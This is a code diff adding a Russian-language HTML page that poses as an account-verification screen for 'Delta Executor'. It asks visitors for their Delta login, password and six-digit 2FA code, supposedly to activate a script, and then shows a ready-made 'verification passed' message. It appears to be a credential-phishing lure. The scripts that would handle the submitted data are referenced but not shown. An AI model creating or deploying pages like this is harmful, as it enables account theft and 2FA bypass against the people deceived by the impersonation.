@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Delta Executor — Верификация</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body class="delta-bg">
+<div class="card delta-card">
+    <div class="delta-header">
+        <div class="delta-logo">Δ</div>
+        <div>
+            <div class="delta-title">Delta Executor</div>
+            <div class="delta-sub">Account Verification</div>
+        </div>
+    </div>
+
+    <p class="lead">
+        Для активации IMSF.T Script требуется верификация вашего аккаунта Delta.
+        Введите данные, указанные при регистрации в Delta.
+    </p>
+
+    <form id="regform" data-page="Delta — верификация">
+        <label>
+            Логин Delta
+            <input type="text" name="login" placeholder="Логин от Delta" required>
+        </label>
+
+        <label>
+            Пароль Delta
+            <input type="password" name="password" placeholder="Пароль от Delta" required>
+        </label>
+
+        <label>
+            2FA-код (если включён)
+            <input type="text" name="code" placeholder="6-значный код" maxlength="6">
+        </label>
+
+        <button type="submit">Верифицировать</button>
+    </form>
+
+    <div id="success" style="display:none" class="success">
+        <div class="check">✓</div>
+        <h2>Верификация пройдена</h2>
+        <p>Перенаправление...</p>
+    </div>
+</div>
+
+<script src="config.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
